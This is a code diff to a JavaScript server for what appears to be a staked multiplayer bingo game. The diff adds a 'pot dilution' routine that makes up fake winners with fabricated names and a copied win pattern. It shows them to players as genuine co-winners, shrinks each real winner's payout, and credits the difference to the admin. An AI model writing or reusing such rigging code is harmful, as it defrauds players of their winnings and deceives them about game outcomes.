@@ -239,7 +239,31 @@ function startCallTicker(io) {
           });
         }
         const pot = new Decimal(eligibleCount).times(game.stake).times(0.8);
-        const split = pot.dividedBy(Math.max(1, winners.length));
+
+        // ── Pot dilution: cap each real winner's share under 100 ──
+        const dilution = biasEngine.computeDilution(pot, winners.length);
+        let fakeWinners = [];
+
+        if (dilution.dilute && dilution.fakesToAdd > 0) {
+          const fakeNames = await biasEngine.pickMultipleFakeNames(dilution.fakesToAdd);
+          const realPattern = winners[0].pattern;
+          for (const fakeName of fakeNames) {
+            fakeWinners.push({
+              name: fakeName,
+              telegramId: "0",
+              index: Math.floor(Math.random() * 200) + 1,
+              slot: 0,
+              pattern: realPattern,
+              isFake: true,
+            });
+          }
+          // Credit admin with the diluted share
+          await biasEngine.creditAdminDilution(game.id, dilution.adminTotal, fakeNames);
+        }
+
+        const split = dilution.dilute
+          ? new Decimal(dilution.sharePerWinner)
+          : pot.dividedBy(Math.max(1, winners.length));
 
         for (const w of winners) {
           await prisma.player.update({
@@ -263,19 +287,31 @@ function startCallTicker(io) {
         // Advance round stats (pattern cycle continues regardless)
         await biasEngine.advanceRoundStats();
 
-        const winnerText = winners.map((w) => w.name).join(" | ");
-        const primary = winners[0];
-
-        io.to(`game_${game.stake}`).emit("message", {
-          type: "winner",
-          winner: winnerText,
-          winners: winners.map((w) => ({
+        // Combine real + fake winners for display
+        const allDisplayWinners = [
+          ...winners.map((w) => ({
             name: w.name,
             telegramId: w.telegramId,
             index: w.index,
             slot: w.slot,
             pattern: w.pattern,
           })),
+          ...fakeWinners.map((f) => ({
+            name: f.name,
+            telegramId: f.telegramId,
+            index: f.index,
+            slot: f.slot,
+            pattern: f.pattern,
+          })),
+        ];
+
+        const winnerText = allDisplayWinners.map((w) => w.name).join(" | ");
+        const primary = winners[0];
+
+        io.to(`game_${game.stake}`).emit("message", {
+          type: "winner",
+          winner: winnerText,
+          winners: allDisplayWinners,
           index: primary.index,
           slot: primary.slot,
           pattern: primary.pattern,
@@ -286,13 +322,7 @@ function startCallTicker(io) {
           `winner_${game.stake}`,
           {
             winner: winnerText,
-            winners: winners.map((w) => ({
-              name: w.name,
-              telegramId: w.telegramId,
-              index: w.index,
-              slot: w.slot,
-              pattern: w.pattern,
-            })),
+            winners: allDisplayWinners,
             index: primary.index,
             slot: primary.slot,
             pattern: primary.pattern,
